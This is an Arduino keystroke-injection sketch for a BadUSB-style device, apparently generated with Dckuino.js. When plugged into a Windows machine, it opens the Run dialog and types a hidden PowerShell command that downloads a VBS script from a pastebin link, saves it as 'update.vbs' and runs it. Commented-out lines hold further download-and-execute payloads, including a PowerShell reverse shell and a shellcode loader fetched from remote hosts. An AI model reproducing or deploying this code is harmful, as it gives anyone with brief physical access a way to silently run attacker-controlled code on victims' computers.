/*
   Generated with <3 by Dckuino.js, an open source project !
*/

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);
  //
  //  Keyboard.press(KEY_LEFT_GUI);
  //  Keyboard.press('r');
  //  Keyboard.releaseAll();
  //
  //  delay(1000);

  //Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');");
  delay(100);
  typeKey(KEY_RETURN);
  //Control D (desktop)
  delay(400);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(1000);

  //  //nishan reverse shell
  //  Keyboard.press(KEY_LEFT_GUI);
  //  Keyboard.press('r');
  //  Keyboard.releaseAll();
  //
  //  delay(1000);
  //  //Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/powershell-reverse-shell-/master/powershell%20tcp%20reverse%20shell.ps1');\"");
  //  //Keyboard.print("powershell -windowstyle hidden \"IEX (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/save.vbs'); Start-Process ‘%Temp%\\save.vbs’\"");
  //
  //  delay(100);
  //  typeKey(KEY_RETURN);
  //
  //  //Control D (desktop)
  //  delay(400);
  //  Keyboard.press(KEY_LEFT_GUI);
  //  Keyboard.press('d');
  //  Keyboard.releaseAll();
  //---------------------------------------------------------------------------------------------------------------------------------------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(400);


  Keyboard.print("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");

  delay
  (100);
  typeKey(KEY_RETURN);



  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
